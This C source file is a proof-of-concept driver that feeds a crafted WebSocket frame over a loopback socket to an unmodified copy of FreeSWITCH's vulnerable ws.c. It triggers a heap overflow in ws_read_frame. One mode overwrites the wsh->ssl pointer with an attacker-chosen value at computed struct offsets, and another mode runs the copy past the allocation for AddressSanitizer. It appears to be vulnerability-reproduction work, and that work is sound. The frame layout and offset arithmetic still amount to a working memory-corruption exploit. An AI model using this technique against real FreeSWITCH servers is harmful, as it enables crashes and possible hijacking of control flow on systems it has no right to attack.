/*
 * driver.c -- drive the UNMODIFIED upstream ws.c over a real 127.0.0.1 TCP
 * socket.  The only stand-ins are the Abyss TConn/TSession types and their
 * ConnRead/ConnReadInit/ConnWrite functions (conn.h/session.h in this dir);
 * ws.c and ws.h are byte-for-byte copies of vulnerable parent fbac12b451a1.
 *
 * Two modes:
 *   ptr  : send a frame whose payload is long enough to place a chosen 8-byte
 *          value in wsh->ssl; stop the stream so the copy ends cleanly, then
 *          inspect wsh->ssl directly (no OpenSSL dereference).
 *   asan : send a longer frame so the same copy runs past the 131136-byte
 *          wsh_t allocation and ASan reports the heap-buffer-overflow.
 *
 * This is NOT a live FreeSWITCH process: the mod_xml_rpc HTTP /socket upgrade
 * and the stock allocator's neighbours are still absent.  It shows the real
 * upstream function, the real struct layout and a real loopback socket read.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stddef.h>
#include <unistd.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <signal.h>
#include "ws.h"

static wsh_t *g_wsh;
static uint64_t g_chosen;

static void segv_handler(int sig)
{
    char msg[256];
    int n = snprintf(msg, sizeof(msg),
        "[segv] sig=%d wsh->ssl=%p chosen=%p equal=%d\n",
        sig, g_wsh ? (void *)g_wsh->ssl : NULL, (void *)(uintptr_t)g_chosen,
        g_wsh && g_wsh->ssl == (SSL *)(uintptr_t)g_chosen);
    ssize_t w = write(STDERR_FILENO, msg, (size_t)n);
    (void)w;
    _exit(3);
}


int ConnWrite(TConn *c, const void *data, uint32_t len)
{
    const char *p = (const char *)data;
    uint32_t left = len;
    while (left) {
        ssize_t n = send(c->fd, p, left, 0);
        if (n <= 0) return 0;
        p += n; left -= (uint32_t)n;
    }
    return 1;
}

void ConnRead(TConn *c, int flags, void *a, void *b, const char **readError)
{
    (void)flags; (void)a; (void)b;
    ssize_t r = recv(c->fd, c->buffer.b, BUFFER_SIZE, 0);
    if (r > 0) {
        c->bufferpos = 0;
        c->buffersize = (uint32_t)r;
    } else {
        c->bufferpos = 0;
        c->buffersize = 0;
        if (r < 0 && readError) *readError = strdup("recv error");
    }
}

void ConnReadInit(TConn *c)
{
    c->bufferpos = 0;
    c->buffersize = 0;
}

static int make_loopback_pair(int *srv_out, int *cli_out, int *acc_out)
{
    struct sockaddr_in sa;
    socklen_t sl = sizeof(sa);
    int srv = socket(AF_INET, SOCK_STREAM, 0);
    int cli, acc;
    if (srv < 0) return -1;
    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    sa.sin_port = 0;
    if (bind(srv, (struct sockaddr *)&sa, sizeof(sa)) < 0 || listen(srv, 1) < 0) return -1;
    if (getsockname(srv, (struct sockaddr *)&sa, &sl) < 0) return -1;
    cli = socket(AF_INET, SOCK_STREAM, 0);
    if (cli < 0) return -1;
    if (connect(cli, (struct sockaddr *)&sa, sizeof(sa)) < 0) return -1;
    acc = accept(srv, NULL, NULL);
    if (acc < 0) return -1;
    *srv_out = srv; *cli_out = cli; *acc_out = acc;
    return (int)ntohs(sa.sin_port);
}

static void send_all(int fd, const unsigned char *buf, size_t len)
{
    size_t off = 0;
    while (off < len) {
        ssize_t n = send(fd, buf + off, len - off, 0);
        if (n <= 0) { perror("send"); exit(2); }
        off += (size_t)n;
    }
}

int main(int argc, char **argv)
{
    int mode_ptr = (argc > 1 && !strcmp(argv[1], "ptr"));
    size_t payload_len = mode_ptr ? 131098 : 140000;
    size_t frame_len = 14 + payload_len;
    unsigned char *frame = calloc(frame_len, 1);
    const uint64_t chosen = 0x4142434445464748ULL;
    int srv, cli, acc, port, rc;
    TConn *conn;
    TSession tsession;
    wsh_t *wsh;
    ws_opcode_t oc = WSOC_CLOSE;
    uint8_t *data = NULL;

    if (!frame) return 2;
    /* 14-byte extended-length frame header. */
    frame[0] = 0x82;                 /* FIN + binary opcode */
    frame[1] = 0x7F;                 /* length code 127, unmasked */
    frame[2] = frame[3] = frame[4] = frame[5] = 0xFF; /* low u32 -> -1 */
    frame[6] = frame[7] = frame[8] = frame[9] = 0x00;
    memset(frame + 14, 0x41, payload_len);
    if (mode_ptr) {
        /* stream index 14+k lands at buffer[14+k]; ssl is buffer[131104]. */
        size_t k = offsetof(wsh_t, ssl) - offsetof(wsh_t, buffer) - 14;
        int i;
        for (i = 0; i < 8; i++) frame[14 + k + (size_t)i] = (unsigned char)(chosen >> (8 * i));
    }

    port = make_loopback_pair(&srv, &cli, &acc);
    if (port < 0) { perror("loopback"); return 2; }
    conn = calloc(1, sizeof(*conn));
    conn->fd = acc;
    memset(&tsession, 0, sizeof(tsession));
    tsession.connP = conn;
    wsh = ws_init(&tsession);
    if (!wsh) return 2;
    wsh->handshake = 1; /* WebSocket upgrade is a precondition; skip it here. */
    signal(SIGSEGV, segv_handler);
    signal(SIGBUS, segv_handler);
    g_wsh = wsh;
    g_chosen = chosen;

    printf("[%s] loopback 127.0.0.1:%d offsetof(ssl)=%zu buffer_rel=%zu sizeof(wsh_t)=%zu\n",
           mode_ptr ? "ptr" : "asan", port, offsetof(wsh_t, ssl),
           offsetof(wsh_t, ssl) - offsetof(wsh_t, buffer), sizeof(wsh_t));

    send_all(cli, frame, frame_len);
    shutdown(cli, SHUT_WR); /* EOF makes the unbounded copy loop stop. */

    rc = ws_read_frame(wsh, &oc, &data);
    printf("[%s] ws_read_frame rc=%d oc=%d wsh->ssl=%p chosen=%p\n",
           mode_ptr ? "ptr" : "asan", rc, (int)oc, (void *)wsh->ssl, (void *)(uintptr_t)chosen);
    printf("[dbg] datalen=%d rplen=%d buflen=%zu payload_off=%td ssl_bytes=%02x%02x%02x%02x%02x%02x%02x%02x\n",
           wsh->datalen, wsh->rplen, wsh->buflen, wsh->payload - wsh->buffer,
           (unsigned char)wsh->buffer[131104], (unsigned char)wsh->buffer[131105],
           (unsigned char)wsh->buffer[131106], (unsigned char)wsh->buffer[131107],
           (unsigned char)wsh->buffer[131108], (unsigned char)wsh->buffer[131109],
           (unsigned char)wsh->buffer[131110], (unsigned char)wsh->buffer[131111]);

    if (mode_ptr) {
        int ok = (wsh->ssl == (SSL *)(uintptr_t)chosen);
        printf("[ptr] RESULT=%s (chosen value landed in wsh->ssl)\n", ok ? "PASS" : "FAIL");
        free(frame); free(conn); free(wsh);
        close(cli); close(acc); close(srv);
        return ok ? 0 : 1;
    }
    /* asan mode: report printed by ASan on stderr; keep process alive past it. */
    free(frame); free(conn); free(wsh);
    close(cli); close(acc); close(srv);
    return 0;
}
